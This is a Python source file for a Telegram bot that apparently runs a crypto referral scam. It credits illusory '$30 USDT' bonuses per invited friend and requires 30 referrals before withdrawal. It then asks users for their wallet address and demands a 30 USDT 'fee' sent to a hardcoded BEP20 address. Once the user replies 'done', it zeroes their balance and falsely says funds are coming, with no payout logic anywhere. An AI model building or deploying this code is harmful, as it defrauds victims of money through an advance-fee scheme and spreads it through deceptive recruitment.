import os
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters, ConversationHandler
from dotenv import load_dotenv
from database import (
    create_user, get_user, get_user_by_referral_code, add_referral,
    get_referral_count, get_balance, update_balance, create_withdrawal_request,
    get_pending_withdrawal, mark_withdrawal_processing, update_withdrawal_status
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0"))

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
WAITING_FOR_WALLET = 1
WAITING_FOR_FEE_PAYMENT = 2


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command with optional referral code."""
    try:
        user = update.effective_user
        user_id = user.id
        
        existing_user = get_user(user_id)
        
        if existing_user:
            # User already registered
            await update.message.reply_text(
                f"Welcome back, {user.first_name}! 👋\n\n"
                f"Your balance: ${get_balance(user_id):.2f}\n"
                f"Your referrals: {get_referral_count(user_id)}\n\n"
                f"Use /menu to see available options."
            )
        else:
            # New user registration
            referral_code = None
            if context.args:
                referral_code = context.args[0]
            
            # Create new user with 30 USDT bonus
            new_user = create_user(user_id, user.username or "unknown", user.first_name)
            
            if new_user:
                # If referred by someone, add referral
                if referral_code:
                    referrer = get_user_by_referral_code(referral_code)
                    if referrer:
                        add_referral(referrer["user_id"], user_id)
                        # Notify referrer
                        try:
                            await context.bot.send_message(
                                chat_id=referrer["user_id"],
                                text=f"🎉 Congratulations! You earned $30 USDT!\n\n"
                                f"A new user joined through your referral link.\n"
                                f"New user ID: {user_id}\n\n"
                                f"Your new balance: ${get_balance(referrer['user_id']):.2f}"
                            )
                        except Exception as e:
                            logger.error(f"Failed to notify referrer: {e}")
                
                # Notify admin
                try:
                    await context.bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=f"✅ New user registered!\n\n"
                        f"User ID: {user_id}\n"
                        f"Username: {user.username or 'N/A'}\n"
                        f"Name: {user.first_name}\n"
                        f"Referral Code: {new_user['referral_code']}"
                    )
                except Exception as e:
                    logger.error(f"Failed to notify admin: {e}")
                
                # Send welcome message to new user
                bot_username = (await context.bot.get_me()).username
                await update.message.reply_text(
                    f"Welcome, {user.first_name}! 🚀\n\n"
                    f"This is a highly profitable bot where you can earn a lot of money by inviting friends.\n\n"
                    f"You've received $30 USDT as a sign-up bonus!\n\n"
                    f"Your referral link: https://t.me/{bot_username}?start={new_user['referral_code']}\n\n"
                    f"Share this link with your friends and earn $30 USDT for each friend who joins!\n\n"
                    f"Use /menu to see available options."
                )
            else:
                await update.message.reply_text("Error creating user. Please try again later.")
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")


async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show main menu."""
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        await update.message.reply_text("Please use /start to register first.")
        return
    
    balance = get_balance(user_id)
    referral_count = get_referral_count(user_id)
    
    keyboard = [
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("👥 My Referrals", callback_data="referrals")],
        [InlineKeyboardButton("🔗 Referral Link", callback_data="referral_link")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"📊 Main Menu\n\n"
        f"Balance: ${balance:.2f}\n"
        f"Referrals: {referral_count}/30\n\n"
        f"Choose an option:",
        reply_markup=reply_markup
    )


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle button clicks."""
    query = update.callback_query
    user_id = query.from_user.id
    
    await query.answer()
    
    if query.data == "balance":
        balance = get_balance(user_id)
        await query.edit_message_text(
            text=f"💰 Your Balance\n\n"
            f"Current balance: ${balance:.2f}"
        )
    
    elif query.data == "referrals":
        referral_count = get_referral_count(user_id)
        await query.edit_message_text(
            text=f"👥 Your Referrals\n\n"
            f"Total referrals: {referral_count}/30\n\n"
            f"You need {max(0, 30 - referral_count)} more referrals to withdraw."
        )
    
    elif query.data == "referral_link":
        user = get_user(user_id)
        bot_username = (await context.bot.get_me()).username
        referral_link = f"https://t.me/{bot_username}?start={user['referral_code']}"
        await query.edit_message_text(
            text=f"🔗 Your Referral Link\n\n"
            f"{referral_link}\n\n"
            f"Share this link with your friends to earn $30 USDT per referral!"
        )
    
    elif query.data == "withdraw":
        referral_count = get_referral_count(user_id)
        if referral_count < 30:
            await query.edit_message_text(
                text=f"❌ Withdrawal Not Available\n\n"
                f"You need at least 30 referrals to withdraw.\n"
                f"Current referrals: {referral_count}/30"
            )
        else:
            await query.edit_message_text(
                text="Please enter your BEP20 wallet address to proceed with withdrawal."
            )
            return WAITING_FOR_WALLET
    
    return ConversationHandler.END


async def handle_wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle wallet address input."""
    user_id = update.effective_user.id
    wallet_address = update.message.text.strip()
    
    # Basic validation for BEP20 address (should start with 0x and be 42 chars)
    if not wallet_address.startswith("0x") or len(wallet_address) != 42:
        await update.message.reply_text(
            "❌ Invalid wallet address. Please enter a valid BEP20 address (starting with 0x)."
        )
        return WAITING_FOR_WALLET
    
    # Store wallet address in context for next step
    context.user_data["wallet_address"] = wallet_address
    
    await update.message.reply_text(
        f"✅ Wallet address received: {wallet_address}\n\n"
        f"To complete your withdrawal, please send 30 USDT to the following address:\n\n"
        f"<code>0x4Cf3D10FcF9E94643a9F72e3Dd97B8768F78f2B0</code>\n\n"
        f"Network: BEP20 (Binance Smart Chain)\n\n"
        f"After sending, reply with 'done' to confirm the payment."
    )
    return WAITING_FOR_FEE_PAYMENT


async def handle_fee_payment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle fee payment confirmation."""
    user_id = update.effective_user.id
    message_text = update.message.text.strip().lower()
    
    if message_text == "done":
        balance = get_balance(user_id)
        wallet_address = context.user_data.get("wallet_address")
        
        # Create withdrawal request
        withdrawal = create_withdrawal_request(user_id, wallet_address, balance)
        
        if withdrawal:
            # Deduct balance
            update_balance(user_id, -balance)
            
            # Mark as processing
            mark_withdrawal_processing(user_id)
            
            await update.message.reply_text(
                f"⏳ Processing...\n\n"
                f"Your withdrawal is being processed.\n"
                f"Amount: ${balance:.2f}\n"
                f"Wallet: {wallet_address}\n\n"
                f"You will receive your funds shortly."
            )
            
            # Notify admin
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"💳 New Withdrawal Request\n\n"
                f"User ID: {user_id}\n"
                f"Amount: ${balance:.2f}\n"
                f"Wallet: {wallet_address}\n"
                f"Status: Processing"
            )
        else:
            await update.message.reply_text("Error processing withdrawal. Please try again.")
        
        return ConversationHandler.END
    else:
        await update.message.reply_text(
            "Please reply with 'done' after sending the 30 USDT fee to the provided address."
        )
        return WAITING_FOR_FEE_PAYMENT


async def check_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check balance with /balance command."""
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        await update.message.reply_text("Please use /start to register first.")
        return
    
    balance = get_balance(user_id)
    await update.message.reply_text(f"💰 Your balance: ${balance:.2f}")


async def get_referral_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Get referral link with /referral command."""
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        await update.message.reply_text("Please use /start to register first.")
        return
    
    bot_username = (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start={user['referral_code']}"
    
    await update.message.reply_text(
        f"🔗 Your Referral Link:\n\n"
        f"{referral_link}\n\n"
        f"Share this with friends to earn $30 USDT per referral!"
    )


def main():
    """Start the bot."""
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handler for withdrawal
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="withdraw")],
        states={
            WAITING_FOR_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_address)],
            WAITING_FOR_FEE_PAYMENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_fee_payment)],
        },
        fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
    )
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("balance", check_balance))
    app.add_handler(CommandHandler("referral", get_referral_link))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(conv_handler)
    
    # Start the bot
    app.run_polling()


if __name__ == "__main__":
    main()
